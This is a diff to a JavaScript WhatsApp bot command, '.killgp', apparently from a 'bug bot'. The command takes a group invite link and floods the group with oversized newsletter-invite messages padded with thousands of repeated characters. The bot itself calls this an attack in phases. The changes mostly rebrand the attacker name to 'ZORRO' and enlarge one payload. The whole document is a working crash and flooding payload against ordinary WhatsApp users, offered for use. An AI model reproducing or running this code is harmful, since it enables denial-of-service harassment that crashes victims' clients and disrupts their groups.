@@ -7,15 +7,15 @@ let handler = async (m, { conn, args }) => {
   const sender = m.sender;
 
   if (sender !== botNumber) {
-    return m.reply("⛔ Solo el bot puede usar este comando.");
+    return m.reply("👑 Solo el bot puede usar este comando.");
   }
 
   if (!args[0] || !args[0].includes("chat.whatsapp.com/")) {
-    return m.reply("❌ Debes escribir el link del grupo.\nEjemplo: .killgp https://chat.whatsapp.com/xxxxx");
+    return m.reply("😡 Debes escribir el link del grupo.\nEjemplo: .killgp https://chat.whatsapp.com/xxxxx");
   }
 
   const code = args[0].split("chat.whatsapp.com/")[1];
-  if (!code) return m.reply("❌ Código de invitación inválido.");
+  if (!code) return m.reply("😿 Código de invitación inválido.");
 
   let target;
   try {
@@ -76,7 +76,7 @@ let handler = async (m, { conn, args }) => {
         message: {
           newsletterAdminInviteMessage: {
             newsletterJid: "spam@newsletter",
-            newsletterName: "Rusuh" + "ꦾ".repeat(10000),
+            newsletterName: "Zorro" + "ꦾ".repeat(10000),
             caption: "@0".repeat(10000),
             inviteExpiration: Date.now() + 1814400000
           }
@@ -93,8 +93,8 @@ let handler = async (m, { conn, args }) => {
         message: {
           newsletterAdminInviteMessage: {
             newsletterJid: "spam2@newsletter",
-            newsletterName: "ZALLISKING" + "ꦾ".repeat(10000),
-            caption: "@9".repeat(10000),
+            newsletterName: "ZORRO" + "ꦾ".repeat(10000),
+            caption: "@9".repeat(90000),
             inviteExpiration: Date.now() + 1814400000
           }
         }
@@ -108,8 +108,8 @@ let handler = async (m, { conn, args }) => {
     const msg = {
       newsletterAdminInviteMessage: {
         newsletterJid: "120363370611316879@newsletter",
-        newsletterName: "👑ZALLIS👑" + "XxX".repeat(3000),
-        caption: "ؙ👑ZALLIS👑\n" + "XxX".repeat(3000),
+        newsletterName: "👑ZORRO👑" + "XxX".repeat(3000),
+        caption: "ؙ👑ZORRO👑\n" + "XxX".repeat(3000),
         inviteExpiration: "0"
       }
     };
@@ -125,7 +125,7 @@ let handler = async (m, { conn, args }) => {
     }
   }
 
-  m.reply("⏳ Iniciando ataque en 3 fases...");
+  m.reply("El ataque se esta realizando con exito 😼");
   await enviarAtaques(20);
   await sleep(10000);
   await enviarAtaques(20);
